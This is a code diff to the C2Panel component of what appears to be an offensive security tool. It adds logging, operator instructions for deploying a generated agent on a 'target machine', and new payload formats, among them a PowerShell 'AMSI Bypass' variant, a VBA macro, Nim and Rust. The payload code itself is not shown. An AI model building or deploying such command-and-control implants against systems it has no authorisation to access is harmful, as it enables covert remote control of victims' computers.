@@ -87,6 +87,7 @@ export function C2Panel() {
       if (result) {
         setServerStatus({ running: true, agents: 0, tasks: 0 });
         addLog(`C2 server started on ${config.listenHost}:${config.listenPort}`);
+        window.api.addActivity({ tab: 'c2', type: 'start', label: 'C2 Server Started', detail: `Listening on ${config.listenHost}:${config.listenPort}${config.useHttps ? ' (HTTPS)' : ''}` });
       }
     } catch (err: any) {
       addLog(`Error: ${err.message}`);
@@ -98,6 +99,7 @@ export function C2Panel() {
     setServerStatus(null);
     setAgents([]);
     addLog('C2 server stopped');
+    window.api.addActivity({ tab: 'c2', type: 'stop', label: 'C2 Server Stopped', detail: '' });
   }, []);
 
   const handleRefresh = useCallback(async () => {
@@ -116,6 +118,7 @@ export function C2Panel() {
       if (result) {
         addLog(`Sent to ${selectedAgent}: ${command.slice(0, 60)}`);
         setCustomCommand('');
+        window.api.addActivity({ tab: 'c2', type: 'command', label: `Command: ${command.slice(0, 40)}`, detail: `Agent: ${selectedAgent.slice(0, 8)}...` });
         // Refresh tasks
         const t = await window.api.c2Tasks(selectedAgent);
         setTasks(t);
@@ -227,7 +230,14 @@ export function C2Panel() {
               <div className="text-center py-6 text-gray-600">
                 <span className="text-2xl block mb-2">📡</span>
                 <p className="text-xs">Waiting for agents to connect...</p>
-                <p className="text-[10px] mt-1">Deploy the agent payload on a target</p>
+                <p className="text-[10px] mt-2 text-gray-500">
+                  1. Generate a payload below → Copy the script<br />
+                  2. Save it as <code className="bg-midnight-950 px-1 rounded text-green-400">agent.py</code><br />
+                  3. Open a <span className="text-yellow-400">separate terminal</span> and run:<br />
+                  <code className="bg-midnight-950 px-1 rounded text-green-400 block mt-1 text-[9px]">python agent.py</code><br />
+                  4. <span className="text-yellow-400">Keep that terminal open</span> — the agent loops every 5s
+                </p>
+                <p className="text-[9px] mt-2 text-gray-600">Agent appears here within ~10s if it connects</p>
               </div>
             ) : (
               <div className="space-y-1.5 max-h-80 overflow-y-auto">
@@ -291,6 +301,10 @@ export function C2Panel() {
                   ))}
                 </div>
 
+                <p className="text-[9px] text-gray-600 mb-2">
+                  ⏱ Agent polls every 5s — results appear below within a few seconds after sending
+                </p>
+
                 {/* Custom command input */}
                 <div className="flex gap-2 mb-3">
                   <input
@@ -340,9 +354,17 @@ export function C2Panel() {
         <div className="card-header">Generate Agent Payload</div>
         <div className="flex items-center gap-3 mb-3">
           <select value={payloadType} onChange={(e) => setPayloadType(e.target.value as any)}
-            className="input-field h-9 text-xs w-40">
-            <option value="python" className="bg-midnight-900">Python Agent</option>
-            <option value="powershell" className="bg-midnight-900">PowerShell Agent</option>
+            className="input-field h-9 text-xs w-44">
+            <option value="python" className="bg-midnight-900">🐍 Python</option>
+            <option value="powershell" className="bg-midnight-900">💻 PowerShell</option>
+            <option value="powershell-amsi" className="bg-midnight-900">🛡️ PowerShell (AMSI Bypass)</option>
+            <option value="batch" className="bg-midnight-900">📝 Batch (.bat)</option>
+            <option value="bash" className="bg-midnight-900">🐧 Bash (Linux)</option>
+            <option value="sh" className="bg-midnight-900">⚙️ SH (BusyBox)</option>
+            <option value="csharp" className="bg-midnight-900">🔷 C# (.NET)</option>
+            <option value="vba" className="bg-midnight-900">📎 VBA Macro</option>
+            <option value="nim" className="bg-midnight-900">🦀 Nim</option>
+            <option value="rust" className="bg-midnight-900">⚡ Rust</option>
           </select>
           <button onClick={handleGeneratePayload} className="btn-primary h-9 text-xs">
             Generate
@@ -357,9 +379,14 @@ export function C2Panel() {
             {payloadScript}
           </pre>
         )}
-        <p className="text-[10px] text-gray-600 mt-2">
-          Deploy on target: <code className="bg-midnight-950 px-1 rounded text-green-400">python c2_agent.py http://your-ip:{config.listenPort}</code>
-        </p>
+        <div className="mt-3 space-y-1 text-[10px] text-gray-500 border-t border-midnight-800 pt-3">
+          <p><span className="text-yellow-400">①</span> Click <span className="text-green-400">Generate</span> then <span className="text-green-400">📋 Copy</span></p>
+          <p><span className="text-yellow-400">②</span> Save as <code className="bg-midnight-950 px-1 rounded text-green-400">agent.py</code> on the target machine</p>
+          <p><span className="text-yellow-400">③</span> Run in a <span className="text-yellow-400">separate terminal</span> and <span className="text-yellow-400">keep it open</span>:</p>
+          <code className="bg-midnight-950 px-2 py-1 rounded text-green-400 block font-mono mt-1">python agent.py</code>
+          <p className="text-gray-600 mt-1">The agent loops every 5s checking for commands. Results appear in the command console above.</p>
+          <p className="text-gray-600">For remote targets, change <code className="bg-midnight-950 px-1 rounded">127.0.0.1</code> in the script to your C2 server's IP.</p>
+        </div>
       </div>
 
       {/* ── Activity Log ── */}
@@ -367,7 +394,7 @@ export function C2Panel() {
         <div className="card-header">Activity Log</div>
         <div className="terminal text-[10px] max-h-40 overflow-y-auto">
           {log.length === 0 ? (
-            <span className="text-gray-600">No activity yet. Start the server to begin.</span>
+            <span className="text-gray-600">No activity yet. Start the server, deploy the agent, then send commands.</span>
           ) : (
             log.map((entry, i) => <div key={i} className="text-gray-500">{entry}</div>)
           )}
